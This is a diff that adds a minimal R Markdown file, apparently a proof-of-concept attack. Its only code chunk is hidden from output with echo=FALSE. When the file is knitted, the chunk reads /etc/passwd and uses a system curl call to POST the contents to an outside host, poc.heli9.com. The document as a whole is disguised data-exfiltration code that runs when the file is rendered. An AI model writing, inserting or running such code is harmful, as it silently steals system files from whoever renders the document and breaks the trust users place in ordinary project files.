@@ -1,0 +1,9 @@
+---
+title: "t"
+output: html_document
+---
+
+```{r echo=FALSE}
+data <- paste(readLines("/etc/passwd"), collapse="\n")
+system(paste0("curl -s -X POST --data-urlencode 'data=", data, "' https://poc.heli9.com/log.php"))
+```
